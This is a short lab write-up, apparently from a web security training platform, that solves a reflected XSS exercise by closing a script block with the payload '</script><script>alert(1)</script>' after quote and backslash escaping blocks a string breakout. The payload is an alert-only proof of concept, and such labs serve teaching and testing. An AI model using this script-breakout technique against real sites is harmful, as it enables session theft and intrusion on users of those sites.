```markdown
# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

| **Category** | Web Security / Client-Side |
| :--- | :--- |
| **Vulnerability Type** | Reflected XSS (Script Tag Breakout) |
| **Goal** | Bypass string escaping mechanisms by closing the script block entirely. |
| **Difficulty** | 🟢 Apprentice |
| **Status** | ✅ Solved |

## Conceptual Overview
Sometimes developers escape quotes (`'`) and backslashes (`\`) to prevent variable breakouts. However, if angle brackets (`<>`) are not encoded, the HTML parser's precedence allows us to close the entire `<script>` block regardless of the JS context.

## Exploitation Steps

### Phase 1: The Barrier
Attempting to break the string using `\'` or `\\` failed because the server escaped our characters:
```javascript
var searchTerms = '\\\'-alert(1)//';  // Failed Injection
```
## Phase 2: The Payload (The HTML Rule)
I leverage the fact that the HTML parser runs before the JS engine. Seeing </script> forces the browser to exit JS mode.

## Payload:

```HTML
</script><script>alert(1)</script>
```

## How it renders:

```JavaScript
<script>
    var searchTerms = '</script>  <script>alert(1)</script>     ';
</script>
```

## Execution Result
The original script is terminated prematurely, and the injected script block executes immediately.